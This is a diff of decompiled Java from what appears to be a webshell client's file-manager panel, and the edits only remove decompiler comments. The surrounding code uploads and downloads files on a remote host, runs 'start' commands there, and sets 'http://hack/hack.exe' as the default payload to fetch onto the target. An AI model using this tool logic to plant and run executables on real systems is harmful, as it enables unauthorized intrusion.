@@ -207,23 +207,23 @@ public class ShellFileManager extends JPanel {
         automaticBindClick.bindJButtonClick(this, this);
         automaticBindClick.bindButtonToMenuItem(this, this, this.dataView.getRightClickMenu());
         this.dataView.setActionDblClick(new ActionDblClick() {
-            /* class core.ui.component.ShellFileManager.AnonymousClass1 */
+             
 
-            @Override // core.ui.imp.ActionDblClick
+            @Override 
             public void dblClick(MouseEvent e) {
                 ShellFileManager.this.dataViewDbClick(e);
             }
         });
         this.fileDataTree.setActionDbclick(new ActionDblClick() {
-            /* class core.ui.component.ShellFileManager.AnonymousClass2 */
+             
 
-            @Override // core.ui.imp.ActionDblClick
+            @Override 
             public void dblClick(MouseEvent e) {
                 ShellFileManager.this.fileDataTreeDbClick(e);
             }
         });
         this.dirField.addKeyListener(new KeyAdapter() {
-            /* class core.ui.component.ShellFileManager.AnonymousClass3 */
+             
 
             public void keyPressed(KeyEvent e) {
                 if (e.getKeyChar() == '\n') {
@@ -232,7 +232,7 @@ public class ShellFileManager extends JPanel {
             }
         });
         this.jSplitPane2.setTransferHandler(new TransferHandler() {
-            /* class core.ui.component.ShellFileManager.AnonymousClass4 */
+             
             private static final long serialVersionUID = 1;
 
             public boolean importData(JComponent comp, Transferable t) {
@@ -378,7 +378,7 @@ public class ShellFileManager extends JPanel {
 
     public void bigFileUploadButtonClick(ActionEvent e) {
         new Thread(new Runnable() {
-            /* class core.ui.component.ShellFileManager.AnonymousClass5 */
+             
 
             public void run() {
                 if (ApplicationContext.isGodMode()) {
@@ -404,7 +404,7 @@ public class ShellFileManager extends JPanel {
                 cmdString = String.format("start %s ", inputFile);
             }
             new Thread(new Runnable() {
-                /* class core.ui.component.ShellFileManager.AnonymousClass6 */
+                 
 
                 public void run() {
                     Log.log(String.format("Execute Command Start As %s", cmdString), new Object[0]);
@@ -427,7 +427,7 @@ public class ShellFileManager extends JPanel {
 
     public void bigFileDownloadButtonClick(ActionEvent e) {
         new Thread(new Runnable() {
-            /* class core.ui.component.ShellFileManager.AnonymousClass7 */
+             
 
             public void run() {
                 if (ApplicationContext.isGodMode()) {
@@ -458,7 +458,7 @@ public class ShellFileManager extends JPanel {
         final FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "fileRemoteDown", "http://hack/hack.exe", this.currentDir + "hack.exe");
         if (fileOpertionInfo.getOpertionStatus().booleanValue()) {
             new Thread(new Runnable() {
-                /* class core.ui.component.ShellFileManager.AnonymousClass8 */
+                 
 
                 public void run() {
                     if (ShellFileManager.this.payload.fileRemoteDown(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName())) {
@@ -514,8 +514,8 @@ public class ShellFileManager extends JPanel {
         this.dataView.getModel().fireTableDataChanged();
     }
 
-    /* access modifiers changed from: private */
-    /* access modifiers changed from: public */
+     
+     
     private void GUploadFile(boolean bigFileUpload) {
         FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "upload", "", "");
         if (!fileOpertionInfo.getOpertionStatus().booleanValue() || fileOpertionInfo.getSrcFileName().trim().length() <= 0 || fileOpertionInfo.getDestFileName().trim().length() <= 0) {
@@ -527,8 +527,8 @@ public class ShellFileManager extends JPanel {
         }
     }
 
-    /* access modifiers changed from: private */
-    /* access modifiers changed from: public */
+     
+     
     private void UploadFile(boolean bigFileUpload) {
         JFileChooser chooser = new JFileChooser();
         chooser.setFileSelectionMode(0);
@@ -541,8 +541,8 @@ public class ShellFileManager extends JPanel {
         }
     }
 
-    /* access modifiers changed from: private */
-    /* access modifiers changed from: public */
+     
+     
     private void uploadFile(String uploadFileString, File selectdFile, boolean bigFileUpload) {
         boolean state;
         byte[] data = new byte[0];
@@ -571,8 +571,8 @@ public class ShellFileManager extends JPanel {
         Log.log(String.format("%s finish \t threadId: %s", "upload", Long.valueOf(Thread.currentThread().getId())), new Object[0]);
     }
 
-    /* access modifiers changed from: private */
-    /* access modifiers changed from: public */
+     
+     
     private void GDownloadFile(boolean bigFileDownload) {
         FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion(this.shellEntity.getFrame(), "download", getSelectdFile(), new File(getSelectFileName()).getAbsolutePath());
         if (!fileOpertionInfo.getOpertionStatus().booleanValue() || fileOpertionInfo.getSrcFileName().trim().length() <= 0 || fileOpertionInfo.getDestFileName().trim().length() <= 0) {
@@ -584,8 +584,8 @@ public class ShellFileManager extends JPanel {
         }
     }
 
-    /* access modifiers changed from: private */
-    /* access modifiers changed from: public */
+     
+     
     private void downloadFile(boolean bigFileDownload) {
         boolean z = true;
         JFileChooser chooser = new JFileChooser();
